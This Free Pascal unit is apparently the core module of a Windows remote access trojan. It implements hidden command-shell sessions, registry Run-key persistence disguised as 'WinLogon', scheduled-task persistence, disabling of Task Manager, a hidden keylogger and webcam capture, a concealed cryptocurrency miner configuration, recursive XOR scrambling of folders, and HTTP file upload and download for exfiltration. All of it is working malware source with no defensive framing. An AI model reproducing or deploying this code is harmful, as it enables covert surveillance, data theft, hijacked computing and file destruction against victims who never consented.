unit Brain;

{$mode objfpc}{$H+}

interface

uses
  Classes, Windows, SysUtils, Process, JwaTLHelp32, Registry, ShellAPI, Zipper,
  FileUtil, IdHTTP, IdMultipartFormData, MMSystem, VoidModules, INIFiles, ShlObj;

type
  WinIsWow64 = function(Handle: THandle; var Iret: BOOL): BOOL; stdcall;

function GetParam(Num: LongInt; TheParams: String): String;

function TheComputerName: string;
function TheUserName: string;
function GetLocalTime: String;
procedure SafeExec(ToRun: String; EType: Boolean = false);
procedure SetMonitor(Mode: SmallInt);
procedure CreateActiveCmdSession;
procedure FreeActiveCmdSession;
procedure ExecuteCmdSession(C: String);
function LoadFile(FileName: String): String;
procedure SaveFile(FileName, aText: String; DoAppend: Boolean = false);
function ProcessExists(EXEFileName: string): Boolean;
function ProcessList: String;
procedure DisableTaskMgr(Mode: Boolean);
function GetInstalledPrograms: String;
function GetSystemInfo: String;
procedure GetDriveLetters(var AList: TStringList);
procedure ScanDir(Dir: String; var AList: TStringList);
function DeleteDirectory(const Name: string): Boolean;
procedure ToggleCryptDir(const Name: string; Chave: Word);
procedure ToggleCrypt(FileName: string; Chave: Word);
procedure OpenFileDefault(FileName: String);
function CopyDir(const fromDir, toDir: string): Boolean;
function MoveDir(const fromDir, toDir: string): Boolean;
function MoveFileEx(FileName, NewFileName: String): Boolean;
function MSToString(M: TMemoryStream): AnsiString;
function SFileToString(FileName: String): String;
procedure ZipFolder(DirName: String);
function DownloadFile(URL, LocalName: String): Boolean;
function UploadFile(URL, FileName: String): String;
function SetMasterVolume(VolToSet: word): Boolean;
procedure PlaySound(FileName: String);
procedure PrintDocument(FileName: String);
function InitializeChat(Name: String): Boolean;
procedure FreeChat;
procedure WriteToChat(Msg: String);
function InitializeWebCam: Boolean;
procedure FreeWebCam;
procedure SetupMiner(Pool, Addr, Pass, WID, WIDLoc, Priority, Hide, Process, IdleTime: String);
function InitializeKeylogger(Directory, LogSize: String): Boolean;
procedure FreeKeylogger;
function EncryptStr(const S :WideString; Key: Word): String;
function DecryptStr(const S: String; Key: Word): String;
function GetScriptText(FileName: String): WideString;
function RegKeyExists(RegKeyPath, ValueName: String): Boolean;
function TaskExists(TaskName: String): Boolean;
function AppData: String;
function ExeName: String;
function StartUp: String;
procedure AddToRegStart;
procedure AddTask(TaskName, RunInterval, TaskLocation: String);

const
  MONITOR_ON      = -1;
  MONITOR_OFF     =  2;
  MONITOR_STANDBY =  1;
  EXEC_COMMAND    = False;
  EXEC_FILE       = True;
  CKEY1 = 77776;
  CKEY2 = 13666;

var CmdSession: TProcess;
    DefaultTimeout: LongInt = 10000;
    Chat: TProcess;
    WebCam: TProcess;
    Keylogger: TProcess;
    Key: Word = 333;

implementation

function EncryptStr(const S :WideString; Key: Word): String;
var   i          :Integer;
      RStr       :String;
      RStrB      :TBytes Absolute RStr;
begin
  Result:= '';
  RStr:= UTF8Encode(S);
  for i := 0 to Length(RStr)-1 do begin
    RStrB[i] := RStrB[i] xor (Key shr 8);
    Key := (RStrB[i] + Key) * CKEY1 + CKEY2;
  end;
  for i := 0 to Length(RStr)-1 do begin
    Result:= Result + IntToHex(RStrB[i], 2);
  end;
end;

function DecryptStr(const S: String; Key: Word): String;
var   i, tmpKey  :Integer;
      RStr       :String;
      RStrB      :TBytes Absolute RStr;
      tmpStr     :string;
begin
  tmpStr:= UpperCase(S);
  SetLength(RStr, Length(tmpStr) div 2);
  i:= 1;
  try
    while (i < Length(tmpStr)) do begin
      RStrB[i div 2]:= StrToInt('$' + tmpStr[i] + tmpStr[i+1]);
      Inc(i, 2);
    end;
  except
    Result:= '';
    Exit;
  end;
  for i := 0 to Length(RStr)-1 do begin
    tmpKey:= RStrB[i];
    RStrB[i] := RStrB[i] xor (Key shr 8);
    Key := (tmpKey + Key) * CKEY1 + CKEY2;
  end;
  Result:= {%H-}UTF8Decode(RStr);
end;

function GetSpecialFolderPath(Folder: Integer; CanCreate: Boolean): string;
var
   FilePath: array [0..MAX_PATH] of char;

begin
 SHGetSpecialFolderPath(0, @FilePath[0], FOLDER, CanCreate);
 Result := FilePath;
end;

function AppData: String;
Begin
 Result:=IncludeTrailingPathDelimiter(GetEnvironmentVariable('appdata'));
end;

function ExeName: String;
Begin
 Result:=ExtractFileName(ParamStr(0));
end;

function StartUp: String;
Begin
 Startup:=IncludeTrailingPathDelimiter(GetSpecialFolderPath(CSIDL_ALTSTARTUP, false));
end;

procedure AddTask(TaskName, RunInterval, TaskLocation: String);
Begin
 SafeExec('schtasks.exe /Create /SC '+RunInterval+' /TN '+TaskName+' /TR "'+TaskLocation+'"');
end;

procedure AddToRegStart;
var RegAgent: TRegistry;
Begin
 RegAgent:=TRegistry.Create(KEY_WRITE OR KEY_WOW64_64KEY);
 RegAgent.RootKey := HKEY_CURRENT_USER;
 RegAgent.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',False);
 RegAgent.WriteString('WinLogon',Appdata+ExeName);
 RegAgent.CloseKey;
 RegAgent.Free;
end;

function RegKeyExists(RegKeyPath, ValueName: String): Boolean;
var Ex: Boolean = true;
    Reg: TRegistry;
Begin
 try
   Reg:=TRegistry.Create;
   Reg.RootKey:=HKEY_CURRENT_USER;
   Ex:=Reg.OpenKeyReadOnly(RegKeyPath);
   if Ex then Ex:=Reg.ValueExists(ValueName);
   Reg.Free;
 except
   Ex:=False;
 end;
 Result:=Ex;
end;

function TaskExists(TaskName: String): Boolean;
var FFile: Text;
    Ex: Boolean = false;
    Str: String;
Begin
 {SafeExec('schtasks.exe /Query > "'+GetCurrentDir+'\Temp.txt"');
 AssignFile(FFile, 'Temp.txt');
 Reset(FFile);
 Repeat
  Readln(FFile, Str);
  Ex:=(Pos(TaskName, Str)>0);
 until (EOF(FFile)) or (Ex);
 CloseFile(FFile);
 DeleteFile('Temp.txt');} //This causes the Clieny to hang, I should probably investigate this
 Result:=Ex;
End;

function GetScriptText(FileName: String): WideString;
var FFile: Text;
    SCText: WideString;
Begin
 AssignFile(FFile, FileName);
 Reset(FFile);
 Readln(FFile, ScText);
 CloseFile(FFile);
 Result:=DecryptStr(SCText, Key);
end;

function InitializeKeylogger(Directory, LogSize: String): Boolean;
Begin
 if Not(FileExists('Chat.exe')) then
 Result:=VoidModules.CutLResource('Chat')
 else Result:=True;
 if Result then Begin
 Keylogger:=TProcess.Create(Nil);
 Keylogger.Executable:='Chat.exe';
 Keylogger.Options:=[poNoConsole];
 Keylogger.ShowWindow:=swoHIDE;
 Keylogger.Parameters.Add('key');
 Keylogger.Parameters.Add(Directory);
 Keylogger.Parameters.Add(LogSize);
 Keylogger.Execute;
 end;
end;

procedure FreeKeylogger;
Begin
 PostMessage(Keylogger.Handle, WM_CLOSE, 0, 0);
 Keylogger.Terminate(0);
 Keylogger.Free;
end;

procedure SetupMiner(Pool, Addr, Pass, WID, WIDLoc, Priority, Hide, Process, IdleTime: String);
var MConfig: TINIFile;
Begin
 MConfig:=TINIFile.Create('conf.txt');
 MConfig.WriteString('settings','pool',Pool);
 MConfig.WriteString('settings','address',Addr);
 MConfig.WriteString('settings','password',Pass);
 MConfig.WriteString('settings','worker_id',WID);
 MConfig.WriteString('settings','worker_id_location',WIDLoc);
 MConfig.WriteString('advanced','process_priority',Priority);
 MConfig.WriteString('advanced','hide_window',Hide);
 MConfig.WriteString('advanced','process',Process);
 MConfig.WriteString('advanced','idle_time_before_start',IdleTime);
 MConfig.Free;
end;

function InitializeWebCam: Boolean;
Begin
 if Not(FileExists('Chat.exe')) then
 Result:=VoidModules.CutLResource('Chat')
 else Result:=True;
 if Result then Begin
 WebCam:=TProcess.Create(Nil);
 WebCam.Executable:='Chat.exe';
 WebCam.Options:=[poNoConsole];
 WebCam.ShowWindow:=swoHIDE;
 WebCam.Parameters.Add('cam');
 WebCam.Execute;
 end;
end;

procedure FreeWebCam;
Begin
 WebCam.Terminate(0);
 Sleep(100);
 WebCam.Free;
end;

procedure WriteToChat(Msg: String);
var Buff: String;
Begin
 Buff:=Msg+#10;
 Chat.Input.Write(Buff[1], Length(Buff));
end;

function InitializeChat(Name: String): Boolean;
Begin
 if Not(FileExists('Chat.exe')) then
 Result:=VoidModules.CutLResource('Chat')
 else Result:=True;
 if Result then Begin
 Chat:=TProcess.Create(Nil);
 Chat.Executable:='Chat.exe';
 Chat.Options:=[poUsePipes, poNoConsole];
 Chat.Parameters.Add('chat');
 Chat.Parameters.Add(Name);
 Chat.Execute;
 end;
end;

procedure FreeChat;
Begin
 Chat.Free;
end;

procedure PrintDocument(FileName: String);
Begin
 ShellExecute(0, 'print', PChar(FileName), nil, nil, SW_HIDE) ;
end;

procedure PlaySound(FileName: String);
Begin
 sndPlaySound(PChar(FileName), SND_NODEFAULT Or SND_ASYNC);
end;

function SetMasterVolume(VolToSet: word): Boolean;
var
  MyWaveOutCaps: TWaveOutCaps;
  Volume: Integer;
begin
  Volume:=VolToSet;
  if WaveOutGetDevCaps(
    WAVE_MAPPER,
    @MyWaveOutCaps,
    sizeof(MyWaveOutCaps))=MMSYSERR_NOERROR then Begin
    WaveOutSetVolume(WAVE_MAPPER, MakeLong(Volume, Volume));
    Result:=True
    end else Result:=False;
end;

function UploadFile(URL, FileName: String): String;
var
  HTTP: TIdHTTP;
  Stream: TStringStream;
  Params: TIdMultipartFormDataStream;
begin
 Http := TIdHTTP.Create(nil);
  Stream := TStringStream.Create('');
  try
   Params := TIdMultipartFormDataStream.Create;
   try
    Params.AddFile('File1', FileName,'application/octet-stream');
    try
     HTTP.Post(StringReplace(URL,'https://','http://',[rfIgnoreCase]), Params, Stream);
     Result:=Stream.DataString;
    except
     on E: Exception do
       Result:=('Error during Upload: ' + E.Message);
    end;
   finally
    Params.Free;
   end;
  finally
   Stream.Free;
   HTTP.Free;
  end;
end;

procedure ZipFolder(DirName: String);
var
  AZipper: TZipper;
  TheFileList: TStringList;
begin
  AZipper := TZipper.Create;
  AZipper.Filename := ExtractFileName(DirName)+'.zip';
  TheFileList:=TStringList.Create;
  try
    FindAllFiles(TheFileList, DirName);
    AZipper.Entries.AddFileEntries(TheFileList);
    AZipper.ZipAllFiles;
  finally
    TheFileList.Free;
    AZipper.Free;
  end;
end;

function DownloadFile(URL, LocalName: String): Boolean;
var
  Http: TIdHTTP;
  MS: TMemoryStream;
begin
  Http := TIdHTTP.Create(nil);
  Http.ReadTimeout:=DefaultTimeout;
  try
    MS := TMemoryStream.Create;
    try
      Http.Get(StringReplace(URL,'https://','http://',[rfIgnoreCase]), MS);
      MS.SaveToFile(LocalName);
    finally
      MS.Free;
    end;
  finally
    Http.Free;
  end;
  DownloadFile:=FileExists(LocalName);
end;

function MSToString(M: TMemoryStream): AnsiString;
begin
  SetString(Result, PAnsiChar(M.Memory), M.Size);
end;

function SFileToString(FileName: String): String;
var WS: TMemoryStream;
Begin
  WS:=TMemoryStream.Create;
  WS.LoadFromFile(FileName);
  WS.Position:=0;
  Result:=MSToString(WS);
  WS.Free;
end;

procedure OpenFileDefault(FileName: String);
Begin
 ShellExecute(0, 'open', PChar(FileName), nil, nil, SW_SHOW);
end;

function MoveFileEx(FileName, NewFileName: String): Boolean;
Begin
 Result:=MoveFile(PChar(FileName), PChar(NewFileName));
end;

function CopyDir(const fromDir, toDir: string): Boolean;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc  := FO_COPY;
    fFlags := FOF_FILESONLY;
    pFrom  := PChar(fromDir + #0);
    pTo    := PChar(toDir)
  end;
  Result := (0 = ShFileOperation(fos));
end;


function MoveDir(const fromDir, toDir: string): Boolean;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc  := FO_MOVE;
    fFlags := FOF_FILESONLY;
    pFrom  := PChar(fromDir + #0);
    pTo    := PChar(toDir)
  end;
  Result := (0 = ShFileOperation(fos));
end;

procedure ToggleCrypt(FileName: string; Chave: Word);
 var
   InMS, OutMS: TMemoryStream;
   cnt: Integer;
   C: byte = 0;
 begin
   InMS := TMemoryStream.Create;
   OutMS := TMemoryStream.Create;
   try
     InMS.LoadFromFile(FileName) ;
     InMS.Position := 0;
     for cnt := 0 to InMS.Size - 1 do
       begin
         InMS.Read(C, 1) ;
         C := (C xor not (ord(Chave shr cnt))) ;
         OutMS.Write(C, 1) ;
       end;
     OutMS.SaveToFile(FileName) ;
   finally
     InMS.Free;
     OutMS.Free;
   end;
end;

procedure ToggleCryptDir(const Name: string; Chave: Word);
var
  F: TSearchRec;
begin
  if FindFirst(Name + '\*', faAnyFile, F) = 0 then begin
    try
      repeat
        if (F.Attr and faDirectory <> 0) then begin
          if (F.Name <> '.') and (F.Name <> '..') then begin
            ToggleCryptDir(Name + '\' + F.Name, Chave);
          end;
        end else begin
          ToggleCrypt(Name + '\' + F.Name, Chave);
        end;
      until FindNext(F) <> 0;
    finally
      FindClose(F);
    end;
  end;
end;

function DeleteDirectory(const Name: string): Boolean;
var
  F: TSearchRec;
begin
 Result:=True;
  if FindFirst(Name + '\*', faAnyFile, F) = 0 then begin
    try
      repeat
        if (F.Attr and faDirectory <> 0) then begin
          if (F.Name <> '.') and (F.Name <> '..') then begin
            Result:= Result and DeleteDirectory(Name + '\' + F.Name);
          end;
        end else begin
          Result:= Result and DeleteFile(Name + '\' + F.Name);
        end;
      until FindNext(F) <> 0;
    finally
      FindClose(F);
    end;
    Result:=Result and RemoveDir(Name);
  end;
end;

function GetFileSize(const aFilename: String): Int64;
  var
    info: TWin32FileAttributeData;
  begin
    result := -1;

    if NOT GetFileAttributesEx(PChar(aFileName), GetFileExInfoStandard, @info) then
      EXIT;

    Result := Int64(info.nFileSizeLow) or Int64(info.nFileSizeHigh shl 32);
end;

procedure ScanDir(Dir: String; var AList: TStringList);
var
  SR: TSearchRec;
  AddStr: String;

function GetFileSize: String;
var P: Int64;
Begin
  P:=Int64(SR.FindData.nFileSizeHigh) shl Int64(32) + Int64(SR.FindData.nFileSizeLow);
  if P >= 1000*1000 then Result:=IntToStr(P div (1000*1000))+' MB'
  else if P >= 1000 then Result:=IntToStr(P div 1000)+' KB'
  else Result:=IntToStr(P)+' B';
end;

begin
 AList.Clear;
  if FindFirst(IncludeTrailingBackslash(Dir) + '*.*', faAnyFile or faDirectory, SR) = 0 then
    try
      repeat
        if SR.Name<>'.' then Begin
        AddStr:=SR.Name+'*';
        if (SR.Attr and faDirectory)<>0 then Begin
          AddStr+='File Folder**';
        end else AddStr+=LowerCase(ExtractFileExt(SR.Name))+' File*'+GetFileSize+'*';
        AList.Add(AddStr);
        end;
      until FindNext(Sr) <> 0;
    finally
      FindClose(SR);
    end;
end;

procedure GetDriveLetters(var AList: TStringList);
var
  MyStr: PChar;
  i, Length: Integer;
const
  Size: Integer = 200;
begin
  AList.Clear;
  GetMem(MyStr, Size);
  Length:=GetLogicalDriveStrings(Size, MyStr);
  for i:=0 to Length-1 do
  begin
    if (MyStr[i]>='A')and(MyStr[i]<='Z') then
      AList.Add(MyStr[i]+':\');
  end;
  FreeMem(MyStr);
end;

function TheUserName: string;
var
  iLen: Cardinal;
begin
  iLen := 256;         // UNLEN constant in LMCons.h says 256 - hard coded.
  Result := StringOfChar(#0, iLen);
  GetUserName(PChar(Result), iLen);
  SetLength(Result, iLen);
end;

function OSVersion: string;
begin
  result := 'Windows';
  case Win32MajorVersion of
    4:
      case Win32MinorVersion of
        0: result := 'Windows 95';
        10: result := 'Windows 98';
        90: result := 'Windows ME';
      end;
    5:
      case Win32MinorVersion of
        0: result := 'Windows 2000';
        1: result := 'Windows XP';
      end;
    6:
      case Win32MinorVersion of
        0: result := 'Windows Vista';
        1: result := 'Windows 7';
        2: result := 'Windows 8';
        3: result := 'Windows 8.1';
      end;
    10:
      case Win32MinorVersion of
        0: result := 'Windows 10';
      end;
  end;
end;

function SysLanguages: String;
var
  Count, i: Integer;
  MyLang: PChar;
  Layouts: array [0..16] of Integer;
const
  Size: Integer = 250;
begin
  Result:='';
  GetMem(MyLang, Size);
  Count:=GetKeyboardLayoutList(16, Layouts{%H-});
  for i:=0 to Count-1 do
  begin
    VerLanguageName(Layouts[i], MyLang, Size);
    Result+=(StrPas(MyLang))+', ';
  end;
  FreeMem(MyLang);
  Delete(Result, Length(Result)-1, 2);
end;

function IsOS64Bit: Boolean;
var
  HandleTo64BitsProcess: WinIsWow64;
  Iret                 : Windows.BOOL;
begin
  try
  Result := False;
  Pointer(HandleTo64BitsProcess) := GetProcAddress(GetModuleHandle('kernel32.dll'), 'IsWow64Process');
  if Assigned(HandleTo64BitsProcess) then
  begin
    HandleTo64BitsProcess(GetCurrentProcess, Iret{%H-});
    Result := Iret;
  end;
  except on E: Exception do;
  end;
end;

function GetSystemInfo: String;
var X: String;
Begin
 X:=OSVersion+' '+Win32CSDVersion+' (';
 X+='Version '+IntToStr(Win32MajorVersion)+'.'+IntToStr(Win32MinorVersion)+', ';
 X+='Build '+IntToStr(Win32BuildNumber)+','+sLineBreak;
 if IsOS64Bit then X+='64-bit Edition)'+sLineBreak
 else X+='32-bit Edition)'+sLineBreak;
 X+='Computer Name: '+TheComputerName+sLineBreak;
 X+='Username: '+TheUserName+sLineBreak;
 X+='Available Languages: '+SysLanguages+sLineBreak;
 Result:=X;
end;

function GetInstalledPrograms: String;
var
  AList: TStringList;
  RegAgent: TRegistry;
  I: Integer;
  Str, AStr: string;
begin
  Str:='';
  Writeln('');
  RegAgent:=TRegistry.Create;
  AList:=TStringList.Create;
  With RegAgent Do
  Begin
    RootKey:=HKEY_LOCAL_MACHINE;
    if OpenKey('Software\Microsoft\Windows\CurrentVersion\Uninstall',False) then Begin
    GetKeyNames(AList);
    CloseKey;
    if AList.Count>0 then Begin
    For I:=0 to AList.Count-1 do
    Begin
      RootKey:=HKEY_LOCAL_MACHINE;
      if OpenKey('Software\Microsoft\Windows\CurrentVersion\Uninstall\'+AList[I],False) then Begin
        AStr:=ReadString('DisplayName');
        if AStr<>'' then AStr:='(Unknown) '+AList[I];
        Str+=AStr+sLineBreak;
        CloseKey;
      end else Str+=AList[I]+sLineBreak;
    end;
    end else Str:='You don''t have sufficient privileges for this.';
    end else Str:='Failed to access the registry.';
  end;
  RegAgent.Free;
  Result:=Str+sLineBreak+'Total: '+IntToStr(AList.Count)+' programs.';
  AList.Free;
  Writeln('Free and set.');
end;

procedure DisableTaskMgr(Mode: Boolean);
var
  RegAgent: TRegistry;
begin
  RegAgent := TRegistry.Create;
  RegAgent.RootKey := HKEY_CURRENT_USER;
  RegAgent.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
  if Mode then Begin
    RegAgent.WriteString('DisableTaskMgr', '1');
  end else Begin
    RegAgent.DeleteValue('DisableTaskMgr');
  end;
  RegAgent.CloseKey;
end;

function ProcessList: String;
var
  AList: String;
  Snapshot: THandle;
  pe: TProcessEntry32;
begin
  AList:= '';
  Snapshot := CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
  try
    pe.dwSize := SizeOf(pe);
    if Process32First(Snapshot, pe) then
       AList+='Process Name'+#9+#9+'PID'+#9+'Parent PID'+sLineBreak;
       AList+=pe.szExeFile+#9+#9+'['+IntToStr(pe.th32ProcessID)+']'+#9+'['+IntToStr(pe.th32ParentProcessID)+']'+sLineBreak;
      while Process32Next(Snapshot, pe) do Begin
        AList+=pe.szExeFile+#9+#9+'['+IntToStr(pe.th32ProcessID)+']'+#9+'['+IntToStr(pe.th32ParentProcessID)+']'+sLineBreak;
      end;
  finally
    CloseHandle(Snapshot);
  end;
  ProcessList:=AList;
end;

function ProcessExists(EXEFileName: string): Boolean;
Begin
 Result:=(Pos(EXEFileName, ProcessList)>0);
end;

procedure SaveFile(FileName, aText: String; DoAppend: Boolean = false);
var FFile: Text;
Begin
 AssignFile(FFile, FileName);
 if DoAppend then Append(FFile) else Rewrite(FFile);
 Write(FFile, aText);
 CloseFile(FFile);
end;

function LoadFile(FileName: String): String;
var FFile: Text;
    X: String;
Begin
 Result:='';
 AssignFile(FFile, FileName);
 Reset(FFile);
 Repeat
   Readln(FFile, X);
   Result+=X+sLineBreak;
 Until EOF(FFile);
 CloseFile(FFile);
End;

procedure SetMonitor(Mode: SmallInt);
Begin
  SendMessage(GetForegroundWindow, WM_SYSCOMMAND, SC_MONITORPOWER, Mode);
end;

function GetWindowsSystemDir: String;
var
 vlBuff: Array[0..MAX_PATH-1] of Char;
begin
 getSystemDirectory(vlBuff, MAX_PATH);
 Result := vlBuff;
end;

function GetCommandPrompt: String;
var J: String;
Begin
 J:=GetWindowsSystemDir+'\cmd.exe';
 if Not(FileExists(J)) then Begin
   J:='C:\Windows\System32\cmd.exe';
   if Not(FileExists(J)) then Begin
     J:='C:\Windows\SysWOW64\cmd.exe';
     if Not(FileExists(J)) then
     J:='cmd.exe';
   end;
 end;
 Result:=J;
end;

procedure CreateActiveCmdSession;
Begin
 CmdSession:=TProcess.Create(Nil);
 CmdSession.Executable:=GetCommandPrompt;
 CmdSession.Options:=[poUsePipes, poNewConsole];
 CmdSession.ShowWindow:=swoHIDE;
 CmdSession.Execute;
end;

procedure ExecuteCmdSession(C: String);
var Buff: String;
Begin
 Buff:=C+#10;
 CmdSession.Input.Write(Buff[1], Length(Buff));
end;

procedure FreeActiveCmdSession;
Begin
 CmdSession.Free;
end;

procedure SafeExec(ToRun: String; EType: Boolean = false);
//EType - False = Command
//        True  = Executable
var Cat: TProcess;
Begin
 Cat:=TProcess.Create(Nil);
 Cat.CurrentDirectory:=ExtractFileDir(ParamStr(0));
 if EType then Cat.Executable:=ToRun
 else Begin
   Cat.Executable:=GetCommandPrompt;
   Cat.Parameters.Add('/K '+'"'+StringReplace(ToRun, sLineBreak, ' ^ ', [rfReplaceAll, rfIgnoreCase])+'"');
 end;
 Cat.InheritHandles:=False;
 Cat.ShowWindow:=swoHIDE;
 if Not(EType) then
 Cat.Options:=[poNewConsole, poWaitOnExit];
 Cat.Execute;
 Cat.Free;
end;

function TheComputerName: string;
var
  iLen: Cardinal;
begin
  iLen := MAX_COMPUTERNAME_LENGTH + 1;
  Result := StringOfChar(#0, iLen);
  GetComputerName(PChar(Result), iLen);
  SetLength(Result, iLen);
end;

function GetLocalTime: String;
Begin
  Result:=FormatDateTime('hh:mm:ss', Time);
end;

function GetParam(Num: LongInt; TheParams: String): String;
var J: LongInt;
    A: String;
Begin
 A:=TheParams;
 if Num > 1 then Begin
   For J:=1 to Num - 1 do
   Delete(A, 1, Pos('#', A));
 end;
 Result:=LeftStr(A, Pos('#', A) - 1);
end;

end.

